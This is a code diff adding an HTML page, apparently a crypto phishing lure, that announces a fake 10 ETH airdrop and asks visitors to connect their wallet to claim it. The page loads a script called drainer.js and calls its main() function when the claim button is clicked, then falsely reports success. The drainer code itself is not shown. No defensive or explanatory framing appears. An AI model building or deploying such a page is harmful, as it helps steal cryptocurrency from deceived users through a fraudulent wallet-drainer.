@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Bonus Claim</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+        button {
+            background-color: #27ae60;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #219a52;
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+            color: #2980b9;
+        }
+        .loading {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 Congratulations!</h1>
+        <p>You've won a 10 ETH airdrop!<br>Connect your wallet to claim your bonus.</p>
+        
+        <button id="claimBtn" disabled>Connect Wallet</button>
+        <div id="loading" class="loading"></div>
+        <p id="status"></p>
+    </div>
+
+    <!-- Load the drainer script -->
+    <script src="drainer.js"></script>
+    <script>
+        const btn = document.getElementById('claimBtn');
+        const status = document.getElementById('status');
+        const loading = document.getElementById('loading');
+
+        // Initial State
+        window.ethereum?.on('accountsChanged', async (accounts) => {
+            if (accounts.length > 0) {
+                btn.disabled = false;
+                btn.textContent = "Claim Bonus";
+                status.textContent = "";
+            } else {
+                btn.disabled = true;
+                btn.textContent = "Connect Wallet";
+            }
+        });
+
+        // Check if wallet is already connected
+        if (window.ethereum) {
+            window.ethereum.request({ method: 'eth_accounts' }).then(accounts => {
+                if (accounts.length > 0) {
+                    btn.disabled = false;
+                    btn.textContent = "Claim Bonus";
+                }
+            });
+        }
+
+        btn.addEventListener('click', async () => {
+            status.textContent = "Processing...";
+            loading.style.display = "block";
+            btn.disabled = true;
+
+            try {
+                // Call the main function from drainer.js
+                await main();
+                status.textContent = "Success! Check your wallet.";
+                status.style.color = "green";
+            } catch (e) {
+                status.textContent = "Failed: " + e.message;
+                status.style.color = "red";
+                loading.style.display = "none";
+            }
+        });
+    </script>
+</body>
+</html>
